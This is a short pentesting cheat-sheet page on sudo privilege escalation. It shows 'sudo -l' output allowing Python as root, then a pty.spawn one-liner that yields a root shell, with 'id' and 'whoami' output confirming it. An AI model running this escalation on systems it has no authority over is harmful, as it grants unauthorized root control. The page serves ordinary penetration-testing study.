---
layout: default
title: Python
parent: Sudo
nav_order: 11
---

# Python

---

## Check Sudo Permissions

```bash
armour@mycmsms:~$ sudo -l
Matching Defaults entries for armour on mycmsms:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User armour may run the following commands on mycmsms:
    (root) NOPASSWD: /usr/bin/python

```

We can run Python as root so let's just spawn bash shell and get root privileges.

```bash
armour@mycmsms:~$ sudo /usr/bin/python -c 'import pty;pty.spawn("/bin/bash")'
root@mycmsms:/home/armour# id
uid=0(root) gid=0(root) groups=0(root)
root@mycmsms:/home/armour# whoami
root

```
